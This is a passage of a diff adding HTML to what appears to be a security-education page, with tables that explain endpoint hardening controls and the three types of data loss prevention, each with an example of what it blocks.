+          <tr><td>Application allowlisting</td><td>Only approved apps run — blocks unknown malware</td></tr>
+          <tr><td>Least privilege (no local admin)</td><td>Malware can't install system-wide if user isn't admin</td></tr>
+          <tr><td>Patch management</td><td>Closes known vulnerabilities attackers exploit</td></tr>
+          <tr><td>Host firewall</td><td>Blocks unexpected inbound/outbound connections</td></tr>
+          <tr><td>Disable macros / restrict Office</td><td>Macros are a top malware delivery vector</td></tr>
+          <tr><td>USB control</td><td>Blocks malicious USB drops and data exfiltration</td></tr>
+        </tbody>
+      </table>
+    </div>
+    <div class="concept-card">
+      <div class="concept-label">DLP</div>
+      <div class="concept-title">Data Loss Prevention — Stopping Data From Walking Out</div>
+      <div class="concept-desc">DLP tools detect and prevent sensitive data (PII, credit cards, source code, classified docs) from leaving the organization — whether by accident (employee emails a spreadsheet to wrong address) or malice (insider exfiltrating data). DLP works by inspecting content against patterns and policies at three points:</div>
+      <table class="ai-table">
+        <thead><tr><th>DLP Type</th><th>Where It Watches</th><th>Example Block</th></tr></thead>
+        <tbody>
+          <tr><td>Data in motion</td><td>Network traffic, email, web uploads</td><td>Blocks email containing SSNs to external address</td></tr>
+          <tr><td>Data at rest</td><td>Files on disks, databases, cloud storage</td><td>Finds unencrypted credit card numbers in a file share</td></tr>
+          <tr><td>Data in use</td><td>Endpoint actions (copy, print, USB)</td><td>Blocks copying customer DB to a USB drive</td></tr>
+        </tbody>
+      </table>
+    </div>
+  </div>
+</div>
 <!-- /domain-body sec -->
